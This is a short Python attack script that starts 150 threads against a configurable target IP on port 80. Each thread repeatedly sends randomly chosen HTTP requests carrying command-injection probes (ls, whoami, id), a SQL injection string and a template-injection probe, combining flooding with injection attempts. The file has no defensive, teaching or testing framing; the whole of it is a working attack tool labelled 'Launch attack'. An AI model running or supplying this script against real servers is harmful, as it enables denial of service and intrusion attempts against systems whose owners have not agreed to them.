import socket
import threading
import random
import time

# Configuration
TARGET_IP = "192.168.1.100"  # Replace with actual IP
TARGET_PORT = 80
THREADS = 150
PAYLOADS = [
    "GET /?cmd=ls HTTP/1.1\r\nHost: {}\r\n\r\n",
    "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 13\r\n\r\ncmd=whoami",
    "HEAD /?cmd=id HTTP/1.1\r\nHost: {}\r\n\r\n",
    "GET /?q=' OR 1=1-- HTTP/1.1\r\nHost: {}\r\n\r\n",
    "GET /?inject={{7*7}} HTTP/1.1\r\nHost: {}\r\n\r\n",
]

# Function to send payloads
def send_payload():
    while True:
        try:
            payload = random.choice(PAYLOADS).format(TARGET_IP)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((TARGET_IP, TARGET_PORT))
            s.send(payload.encode())
            s.close()
        except:
            pass
        time.sleep(random.uniform(0.1, 0.3))

# Launch attack
def main():
    for _ in range(THREADS):
        t = threading.Thread(target=send_payload)
        t.daemon = True
        t.start()

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()